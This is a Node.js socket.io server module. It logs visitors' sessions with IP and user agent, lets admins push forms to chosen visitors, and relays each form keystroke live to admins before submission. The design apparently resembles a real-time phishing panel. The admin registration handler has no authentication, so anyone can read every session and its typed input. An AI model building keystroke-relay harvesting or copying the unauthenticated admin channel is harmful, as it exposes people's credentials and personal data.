const { v4: uuidv4 } = require('uuid');
const { pool, upsertFormField } = require('./db');
const { FORM_TEMPLATES } = require('./formTemplates');

const ADMIN_ROOM = 'admins';
const sessionRoom = (sessionId) => `session:${sessionId}`;

// Debounce DB writes for rapid keystrokes without delaying the live relay to admins.
const fieldWriteTimers = new Map();
const FIELD_WRITE_DEBOUNCE_MS = 250;

function scheduleFieldWrite(formId, field, value) {
  const key = `${formId}:${field}`;
  if (fieldWriteTimers.has(key)) clearTimeout(fieldWriteTimers.get(key));
  const timer = setTimeout(async () => {
    fieldWriteTimers.delete(key);
    try {
      await upsertFormField(formId, field, value);
    } catch (err) {
      console.error('Failed to persist field value', err);
    }
  }, FIELD_WRITE_DEBOUNCE_MS);
  fieldWriteTimers.set(key, timer);
}

module.exports = function registerSocket(io) {
  // socket.id -> { type: 'user'|'admin', sessionId?, pageId? }
  const socketMeta = new Map();

  io.on('connection', (socket) => {
    // ---- USER SIDE ----
    socket.on('user:register', async ({ pageId }, ack) => {
      if (!pageId) {
        if (typeof ack === 'function') ack({ error: 'Page not found' });
        return;
      }
      try {
        const [[page]] = await pool.query('SELECT * FROM pages WHERE id = ?', [pageId]);
        if (!page) {
          if (typeof ack === 'function') ack({ error: 'Page not found' });
          return;
        }

        const sessionId = uuidv4();
        const ip = socket.handshake.address || null;
        const userAgent = socket.handshake.headers['user-agent'] || null;

        await pool.query(
          `INSERT INTO sessions (id, page_id, socket_id, status, ip_address, user_agent)
           VALUES (?, ?, ?, 'active', ?, ?)`,
          [sessionId, pageId, socket.id, ip, userAgent]
        );

        socketMeta.set(socket.id, { type: 'user', sessionId, pageId });
        socket.join(sessionRoom(sessionId));

        if (typeof ack === 'function') ack({ sessionId });

        io.to(ADMIN_ROOM).emit('session:new', {
          session: {
            id: sessionId,
            page_id: pageId,
            status: 'active',
            ip_address: ip,
            user_agent: userAgent,
            created_at: new Date().toISOString()
          },
          page: { id: page.id, title: page.title }
        });
      } catch (err) {
        console.error('user:register failed', err);
        if (typeof ack === 'function') ack({ error: 'Registration failed' });
      }
    });

    socket.on('user:formInput', ({ formId, field, value }) => {
      const meta = socketMeta.get(socket.id);
      if (!meta || meta.type !== 'user' || !formId || !field) return;

      scheduleFieldWrite(formId, field, value);

      io.to(ADMIN_ROOM).emit('form:inputUpdate', {
        sessionId: meta.sessionId,
        formId,
        field,
        value
      });
    });

    socket.on('user:formSubmit', async ({ formId, data }) => {
      const meta = socketMeta.get(socket.id);
      if (!meta || meta.type !== 'user' || !formId) return;

      try {
        const entries = Object.entries(data || {});
        for (const [field, value] of entries) {
          await upsertFormField(formId, field, value);
        }
        await pool.query("UPDATE forms SET status = 'submitted' WHERE id = ?", [formId]);

        io.to(ADMIN_ROOM).emit('form:submitted', {
          sessionId: meta.sessionId,
          formId,
          data
        });
      } catch (err) {
        console.error('user:formSubmit failed', err);
      }
    });

    // ---- ADMIN SIDE ----
    socket.on('admin:register', async (_payload, ack) => {
      socketMeta.set(socket.id, { type: 'admin' });
      socket.join(ADMIN_ROOM);

      try {
        const [sessions] = await pool.query(
          `SELECT s.*, p.title AS page_title FROM sessions s
           JOIN pages p ON p.id = s.page_id
           ORDER BY s.created_at DESC LIMIT 200`
        );
        if (typeof ack === 'function') ack({ sessions, formTemplates: FORM_TEMPLATES });
      } catch (err) {
        console.error('admin:register failed', err);
        if (typeof ack === 'function') ack({ sessions: [], formTemplates: FORM_TEMPLATES });
      }
    });

    socket.on('admin:openForm', async ({ sessionId, formType }, ack) => {
      const meta = socketMeta.get(socket.id);
      if (!meta || meta.type !== 'admin') return;

      const template = FORM_TEMPLATES[formType];
      if (!template) {
        if (typeof ack === 'function') ack({ error: 'Unknown form type' });
        return;
      }

      try {
        const formId = uuidv4();
        await pool.query(
          `INSERT INTO forms (id, session_id, form_type, status) VALUES (?, ?, ?, 'open')`,
          [formId, sessionId, formType]
        );

        const payload = { formId, formType, label: template.label, fields: template.fields };

        io.to(sessionRoom(sessionId)).emit('form:open', payload);
        io.to(ADMIN_ROOM).emit('form:opened', { sessionId, ...payload });

        if (typeof ack === 'function') ack({ ok: true, formId });
      } catch (err) {
        console.error('admin:openForm failed', err);
        if (typeof ack === 'function') ack({ error: 'Failed to open form' });
      }
    });

    socket.on('admin:closeForm', async ({ sessionId, formId }) => {
      const meta = socketMeta.get(socket.id);
      if (!meta || meta.type !== 'admin') return;

      try {
        await pool.query("UPDATE forms SET status = 'closed', closed_at = CURRENT_TIMESTAMP WHERE id = ?", [
          formId
        ]);

        io.to(sessionRoom(sessionId)).emit('form:close', { formId });
        io.to(ADMIN_ROOM).emit('form:closed', { sessionId, formId });
      } catch (err) {
        console.error('admin:closeForm failed', err);
      }
    });

    // ---- DISCONNECT ----
    socket.on('disconnect', async () => {
      const meta = socketMeta.get(socket.id);
      socketMeta.delete(socket.id);
      if (!meta) return;

      if (meta.type === 'user' && meta.sessionId) {
        try {
          await pool.query("UPDATE sessions SET status = 'inactive' WHERE id = ?", [
            meta.sessionId
          ]);
        } catch (err) {
          console.error('Failed to mark session inactive', err);
        }
        io.to(ADMIN_ROOM).emit('session:offline', { sessionId: meta.sessionId });
      }
    });
  });
};
